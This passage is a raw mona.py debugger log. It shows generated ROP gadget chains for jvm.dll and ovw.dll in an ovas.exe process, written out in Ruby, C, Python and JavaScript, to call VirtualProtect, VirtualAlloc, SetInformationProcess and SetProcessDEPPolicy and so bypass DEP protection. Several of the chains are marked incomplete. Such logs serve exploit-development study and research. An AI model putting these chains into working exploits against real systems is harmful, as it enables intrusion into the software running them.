                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> ecx
                0x6d371c5e,  # POP EDI # RETN [jvm.dll] 
                0x6d341001,  # RETN (ROP NOP) [jvm.dll]
                0x6d3c1c57,  # POP EAX # RETN [jvm.dll] 
                0x90909090,  # nop
                0x6d35390f,  # PUSHAD # RETN [jvm.dll] 
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u5dbe%u6d34" + // 0x6d345dbe : ,# POP EAX # RETN [jvm.dll] 
              "%u8090%u6d3f" + // 0x6d3f8090 : ,# ptr to &VirtualAlloc() [IAT jvm.dll]
              "%ubea4%u6d3c" + // 0x6d3cbea4 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [jvm.dll] 
              "%u6b54%u6d3d" + // 0x6d3d6b54 : ,# XCHG EAX,ESI # RETN [jvm.dll] 
              "%ufcf5%u6d39" + // 0x6d39fcf5 : ,# POP EBP # RETN [jvm.dll] 
              "%ue2fe%u6d34" + // 0x6d34e2fe : ,# & push esp # ret[jvm.dll]
              "%u379b%u6d38" + // 0x6d38379b : ,# POP EBX # RETN [jvm.dll] 
              "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
              "%udd29%u6d3e" + // 0x6d3edd29 : ,# POP EDX # TEST AL,0FE # DEC ECX # RETN 0x24 [jvm.dll] 
              "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
              "%u67c8%u6d3c" + // 0x6d3c67c8 : ,# POP ECX # RETN [jvm.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
              "%u1c5e%u6d37" + // 0x6d371c5e : ,# POP EDI # RETN [jvm.dll] 
              "%u1001%u6d34" + // 0x6d341001 : ,# RETN (ROP NOP) [jvm.dll]
              "%u1c57%u6d3c" + // 0x6d3c1c57 : ,# POP EAX # RETN [jvm.dll] 
              "%u9090%u9090" + // 0x90909090 : ,# nop
              "%u390f%u6d35" + // 0x6d35390f : ,# PUSHAD # RETN [jvm.dll] 
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
0BADF00D      ROP generator finished
0BADF00D  
0BADF00D  [+] Writing stackpivots to file stackpivot.txt
0BADF00D      Wrote 4537 pivots to file 
0BADF00D  [+] Writing suggestions to file rop_suggestions.txt
0BADF00D      Wrote 1590 suggestions to file
0BADF00D  [+] Writing results to file rop.txt (13379 interesting gadgets)
0BADF00D      Wrote 13379 interesting gadgets to file
0BADF00D  [+] Writing other gadgets to file rop.txt (19389 gadgets)
0BADF00D      Wrote 19389 other gadgets to file
0BADF00D  Done
0BADF00D  
0BADF00D  [+] This mona.py action took 0:02:43.141000
0BADF00D  [+] Command used:
0BADF00D  !mona rop -m ovw.dll
          
          ---------- Mona command started on 2018-10-30 04:52:29 (v2.0, rev 577) ----------
0BADF00D  [+] Processing arguments and criteria
0BADF00D      - Pointer access level : X
0BADF00D      - Only querying modules ovw.dll
0BADF00D  [+] Generating module info table, hang on...
0BADF00D      - Processing modules
0BADF00D      - Done. Let's rock 'n roll.
0BADF00D  [+] Preparing output file '_rop_progress_ovas.exe_29032.log'
0BADF00D      - (Re)setting logfile _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Progress will be written to _rop_progress_ovas.exe_29032.log
0BADF00D  [+] Maximum offset : 40
0BADF00D  [+] (Minimum/optional maximum) stackpivot distance : 8
0BADF00D  [+] Max nr of instructions : 6
0BADF00D  [+] Split output into module rop files ? False
0BADF00D  [+] Enumerating 22 endings in 1 module(s)...
0BADF00D      - Querying module ovw.dll
0BADF00D      - Search complete :
0BADF00D         Ending : RETN 0x0C, Nr found : 8
0BADF00D         Ending : RETN, Nr found : 823
0BADF00D         Ending : RETN 0x18, Nr found : 1
0BADF00D         Ending : RETN 0x08, Nr found : 263
0BADF00D         Ending : RETN 0x02, Nr found : 5
0BADF00D         Ending : RETN 0x10, Nr found : 5
0BADF00D         Ending : RETN 0x00, Nr found : 5
0BADF00D         Ending : RETN 0x14, Nr found : 2
0BADF00D         Ending : RETN 0x04, Nr found : 346
0BADF00D      - Filtering and mutating 1458 gadgets
0BADF00D  ** It looks like you've configured the debugger to produce lowercase disassembly. Got it, all good **
0BADF00D        - Progress update : 100 / 1458 items processed (Tue 2018/10/30 04:52:31 AM) - (6%)
0BADF00D        - Progress update : 200 / 1458 items processed (Tue 2018/10/30 04:52:32 AM) - (13%)
0BADF00D        - Progress update : 300 / 1458 items processed (Tue 2018/10/30 04:52:33 AM) - (20%)
0BADF00D        - Progress update : 400 / 1458 items processed (Tue 2018/10/30 04:52:33 AM) - (27%)
0BADF00D        - Progress update : 500 / 1458 items processed (Tue 2018/10/30 04:52:34 AM) - (34%)
0BADF00D        - Progress update : 600 / 1458 items processed (Tue 2018/10/30 04:52:34 AM) - (41%)
0BADF00D        - Progress update : 700 / 1458 items processed (Tue 2018/10/30 04:52:35 AM) - (48%)
0BADF00D        - Progress update : 800 / 1458 items processed (Tue 2018/10/30 04:52:36 AM) - (54%)
0BADF00D        - Progress update : 900 / 1458 items processed (Tue 2018/10/30 04:52:37 AM) - (61%)
0BADF00D        - Progress update : 1000 / 1458 items processed (Tue 2018/10/30 04:52:38 AM) - (68%)
0BADF00D        - Progress update : 1100 / 1458 items processed (Tue 2018/10/30 04:52:40 AM) - (75%)
0BADF00D        - Progress update : 1200 / 1458 items processed (Tue 2018/10/30 04:52:41 AM) - (82%)
0BADF00D        - Progress update : 1300 / 1458 items processed (Tue 2018/10/30 04:52:43 AM) - (89%)
0BADF00D        - Progress update : 1400 / 1458 items processed (Tue 2018/10/30 04:52:44 AM) - (96%)
0BADF00D        - Progress update : 1458 / 1458 items processed (Tue 2018/10/30 04:52:45 AM) - (100%)
0BADF00D  [+] Creating suggestions list
0BADF00D  [+] Processing suggestions
0BADF00D  [+] Launching ROP generator
0BADF00D  [+] Attempting to produce rop chain for VirtualProtect
0BADF00D      Tue 2018/10/30 04:52:48 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x5a100000 to 0x5a15d000
0BADF00D      Tue 2018/10/30 04:52:51 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:52:51 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:52:51 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:52:51 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:52:51 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:52:51 AM: Step 7/7: eax
0BADF00D  [+] Attempting to produce rop chain for SetInformationProcess
0BADF00D      Tue 2018/10/30 04:52:51 AM: Step 1/6: ebp
0BADF00D      Tue 2018/10/30 04:52:53 AM: Step 2/6: edx
0BADF00D      Tue 2018/10/30 04:52:53 AM: Step 3/6: ecx
0BADF00D      Tue 2018/10/30 04:52:53 AM: Step 4/6: ebx
0BADF00D      Tue 2018/10/30 04:52:53 AM: Step 5/6: eax
0BADF00D      Tue 2018/10/30 04:52:53 AM: Step 6/6: edi
0BADF00D  [+] Attempting to produce rop chain for SetProcessDEPPolicy
0BADF00D      Tue 2018/10/30 04:52:53 AM: Step 1/3: ebp
0BADF00D      Tue 2018/10/30 04:52:56 AM: Step 2/3: ebx
0BADF00D      Tue 2018/10/30 04:52:56 AM: Step 3/3: edi
0BADF00D  [+] Attempting to produce rop chain for VirtualAlloc
0BADF00D      Tue 2018/10/30 04:52:56 AM: Step 1/7: esi
0BADF00D  [+] Searching from 0x5a100000 to 0x5a15d000
0BADF00D      Tue 2018/10/30 04:52:59 AM: Step 2/7: ebp
0BADF00D      Tue 2018/10/30 04:52:59 AM: Step 3/7: ebx
0BADF00D      Tue 2018/10/30 04:52:59 AM: Step 4/7: edx
0BADF00D      Tue 2018/10/30 04:52:59 AM: Step 5/7: ecx
0BADF00D      Tue 2018/10/30 04:52:59 AM: Step 6/7: edi
0BADF00D      Tue 2018/10/30 04:52:59 AM: Step 7/7: eax
0BADF00D  [+] ROP chains written to file rop_chains.txt
          
          ################################################################################
          
          Register setup for VirtualProtect() :
          --------------------------------------------
           EAX = NOP (0x90909090)
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = ReturnTo (ptr to jmp esp)
           ESI = ptr to VirtualProtect()
           EDI = ROP NOP (RETN)
           --- alternative chain ---
           EAX = ptr to &VirtualProtect()
           ECX = lpOldProtect (ptr to W address)
           EDX = NewProtect (0x40)
           EBX = dwSize
           ESP = lPAddress (automatic)
           EBP = POP (skip 4 bytes)
           ESI = ptr to JMP [EAX]
           EDI = ROP NOP (RETN)
           + place ptr to "jmp esp" on stack, below PUSHAD
          --------------------------------------------
          
          
          ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
          ----------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x5a1046df,  # POP EBP # RETN [ovw.dll] 
                0x5a1046df,  # skip 4 bytes [ovw.dll]
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x41414141,  # Filler (compensate)
                0x5a1184f6,  # POP EDX # RETN [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> edx
                0x5a145c8d,  # POP ECX # RETN [ovw.dll] 
                0x5a1543e4,  # &Writable location [ovw.dll]
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x5a10827c,  # RETN (ROP NOP) [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145c6e,  # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a13e96c,  # JMP [EAX] [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145cd4,  # POP EAX # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a10a88b,  # ptr to 'jmp esp' [ovw.dll]
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x5a1046df,  // POP EBP // RETN [ovw.dll] 
                0x5a1046df,  // skip 4 bytes [ovw.dll]
                0x5a145c6f,  // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x00000201,  // 0x00000201-> ebx
                0x41414141,  // Filler (compensate)
                0x5a1184f6,  // POP EDX // RETN [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000040,  // 0x00000040-> edx
                0x5a145c8d,  // POP ECX // RETN [ovw.dll] 
                0x5a1543e4,  // &Writable location [ovw.dll]
                0x5a145c6d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x5a10827c,  // RETN (ROP NOP) [ovw.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a145c6e,  // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a13e96c,  // JMP [EAX] [ovw.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x5a145cd4,  // POP EAX // RETN 0x0C [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x6d3f8098,  // ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a10a88b,  // ptr to 'jmp esp' [ovw.dll]
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x5a1046df,  # POP EBP # RETN [ovw.dll] 
                0x5a1046df,  # skip 4 bytes [ovw.dll]
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x41414141,  # Filler (compensate)
                0x5a1184f6,  # POP EDX # RETN [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000040,  # 0x00000040-> edx
                0x5a145c8d,  # POP ECX # RETN [ovw.dll] 
                0x5a1543e4,  # &Writable location [ovw.dll]
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x5a10827c,  # RETN (ROP NOP) [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145c6e,  # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a13e96c,  # JMP [EAX] [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x5a145cd4,  # POP EAX # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x6d3f8098,  # ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a10a88b,  # ptr to 'jmp esp' [ovw.dll]
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u46df%u5a10" + // 0x5a1046df : ,# POP EBP # RETN [ovw.dll] 
              "%u46df%u5a10" + // 0x5a1046df : ,# skip 4 bytes [ovw.dll]
              "%u5c6f%u5a14" + // 0x5a145c6f : ,# POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u84f6%u5a11" + // 0x5a1184f6 : ,# POP EDX # RETN [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
              "%u5c8d%u5a14" + // 0x5a145c8d : ,# POP ECX # RETN [ovw.dll] 
              "%u43e4%u5a15" + // 0x5a1543e4 : ,# &Writable location [ovw.dll]
              "%u5c6d%u5a14" + // 0x5a145c6d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u827c%u5a10" + // 0x5a10827c : ,# RETN (ROP NOP) [ovw.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u5c6e%u5a14" + // 0x5a145c6e : ,# POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%ue96c%u5a13" + // 0x5a13e96c : ,# JMP [EAX] [ovw.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u5cd4%u5a14" + // 0x5a145cd4 : ,# POP EAX # RETN 0x0C [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u8098%u6d3f" + // 0x6d3f8098 : ,# ptr to &VirtualProtect() (skipped module criteria, check if pointer is reliable !) [IAT jvm.dll]
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%ua88b%u5a10" + // 0x5a10a88b : ,# ptr to 'jmp esp' [ovw.dll]
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetInformationProcess() :
          --------------------------------------------
           EAX = SizeOf(ExecuteFlags) (0x4)
           ECX = &ExecuteFlags (ptr to 0x00000002)
           EDX = ProcessExecuteFlags (0x22)
           EBX = NtCurrentProcess (0xffffffff)
           ESP = ReturnTo (automatic)
           EBP = ptr to NtSetInformationProcess()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
          ---------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find API pointer -> eax+4
                0x5a131dc5,  # MOV EAX,DWORD PTR DS:[EAX+4] # POP EBP # RETN [ovw.dll] 
                0x41414141,  # Filler (compensate)
                0x5a1157e7,  # XCHG EAX,EBP # RETN [ovw.dll] 
                0x5a1184f6,  # POP EDX # RETN [ovw.dll] 
                0x00000022,  # 0x00000022-> edx
                0x5a145c8d,  # POP ECX # RETN [ovw.dll] 
                0x5a1461ac,  # &0x00000002 [ovw.dll]
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x41414141,  # Filler (compensate)
                0x5a145cd4,  # POP EAX # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a145c6d,  # skip 4 bytes [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ].flatten.pack("V*")
          
              return rop_gadgets
          
            end
          
          
            # Call the ROP chain generator inside the 'exploit' function :
          
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ C ] ***
          
            #define CREATE_ROP_CHAIN(name, ...) \
              int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
              unsigned int name[name##_length / sizeof(unsigned int)]; \
              create_rop_chain(name, ##__VA_ARGS__);
          
            int create_rop_chain(unsigned int *buf, unsigned int )
            {
              // rop chain generated with mona.py - www.corelan.be
              unsigned int rop_gadgets[] = {
                0x00000000,  // [-] Unable to find API pointer -> eax+4
                0x5a131dc5,  // MOV EAX,DWORD PTR DS:[EAX+4] // POP EBP // RETN [ovw.dll] 
                0x41414141,  // Filler (compensate)
                0x5a1157e7,  // XCHG EAX,EBP // RETN [ovw.dll] 
                0x5a1184f6,  // POP EDX // RETN [ovw.dll] 
                0x00000022,  // 0x00000022-> edx
                0x5a145c8d,  // POP ECX // RETN [ovw.dll] 
                0x5a1461ac,  // &0x00000002 [ovw.dll]
                0x5a145c6f,  // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0xffffffff,  // 0xffffffff-> ebx
                0x41414141,  // Filler (compensate)
                0x5a145cd4,  // POP EAX // RETN 0x0C [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x00000004,  // 0x00000004-> eax
                0x5a145c6d,  // POP EDI // POP ESI // POP EBX // POP EBP // RETN 0x0C [ovw.dll] 
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x5a145c6d,  // skip 4 bytes [ovw.dll]
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x41414141,  // Filler (compensate)
                0x00000000,  // [-] Unable to find pushad gadget
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
                0x41414141,  // Filler (RETN offset compensation)
              };
              if(buf != NULL) {
                memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
              };
              return sizeof(rop_gadgets);
            }
          
            // use the 'rop_chain' variable after this call, it's just an unsigned int[]
            CREATE_ROP_CHAIN(rop_chain, );
            // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
            // unsigned int rop_chain[256];
            // int rop_chain_length = create_rop_chain(rop_chain, );
          
          *** [ Python ] ***
          
            def create_rop_chain():
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = [
                0x00000000,  # [-] Unable to find API pointer -> eax+4
                0x5a131dc5,  # MOV EAX,DWORD PTR DS:[EAX+4] # POP EBP # RETN [ovw.dll] 
                0x41414141,  # Filler (compensate)
                0x5a1157e7,  # XCHG EAX,EBP # RETN [ovw.dll] 
                0x5a1184f6,  # POP EDX # RETN [ovw.dll] 
                0x00000022,  # 0x00000022-> edx
                0x5a145c8d,  # POP ECX # RETN [ovw.dll] 
                0x5a1461ac,  # &0x00000002 [ovw.dll]
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0xffffffff,  # 0xffffffff-> ebx
                0x41414141,  # Filler (compensate)
                0x5a145cd4,  # POP EAX # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x00000004,  # 0x00000004-> eax
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x5a145c6d,  # skip 4 bytes [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x41414141,  # Filler (compensate)
                0x00000000,  # [-] Unable to find pushad gadget
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
              ]
              return ''.join(struct.pack('<I', _) for _ in rop_gadgets)
          
            rop_chain = create_rop_chain()
          
          
          
          *** [ JavaScript ] ***
          
            //rop chain generated with mona.py - www.corelan.be
            rop_gadgets = unescape(
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find API pointer -> eax+4
              "%u1dc5%u5a13" + // 0x5a131dc5 : ,# MOV EAX,DWORD PTR DS:[EAX+4] # POP EBP # RETN [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u57e7%u5a11" + // 0x5a1157e7 : ,# XCHG EAX,EBP # RETN [ovw.dll] 
              "%u84f6%u5a11" + // 0x5a1184f6 : ,# POP EDX # RETN [ovw.dll] 
              "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
              "%u5c8d%u5a14" + // 0x5a145c8d : ,# POP ECX # RETN [ovw.dll] 
              "%u61ac%u5a14" + // 0x5a1461ac : ,# &0x00000002 [ovw.dll]
              "%u5c6f%u5a14" + // 0x5a145c6f : ,# POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u5cd4%u5a14" + // 0x5a145cd4 : ,# POP EAX # RETN 0x0C [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
              "%u5c6d%u5a14" + // 0x5a145c6d : ,# POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u5c6d%u5a14" + // 0x5a145c6d : ,# skip 4 bytes [ovw.dll]
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (compensate)
              "%u0000%u0000" + // 0x00000000 : ,# [-] Unable to find pushad gadget
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              "%u4141%u4141" + // 0x41414141 : ,# Filler (RETN offset compensation)
              ""); //  : 
          
          
          --------------------------------------------------------------------------------------------------
          
          
          ################################################################################
          
          Register setup for SetProcessDEPPolicy() :
          --------------------------------------------
           EAX = <not used>
           ECX = <not used>
           EDX = <not used>
           EBX = dwFlags (ptr to 0x00000000)
           ESP = ReturnTo (automatic)
           EBP = ptr to SetProcessDEPPolicy()
           ESI = <not used>
           EDI = ROP NOP (4 byte stackpivot)
          --------------------------------------------
          
          
          ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
          ---------------------------------------------------------------------------------------------------------------
          
          *** [ Ruby ] ***
          
            def create_rop_chain()
          
              # rop chain generated with mona.py - www.corelan.be
              rop_gadgets = 
              [
                0x00000000,  # [-] Unable to find ptr to SetProcessDEPPolicy() (-> to be put in ebp)
                0x5a145c6f,  # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x5a146004,  # &0x00000000 [ovw.dll]
                0x41414141,  # Filler (compensate)
                0x5a145c6d,  # POP EDI # POP ESI # POP EBX # POP EBP # RETN 0x0C [ovw.dll] 
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
                0x41414141,  # Filler (RETN offset compensation)
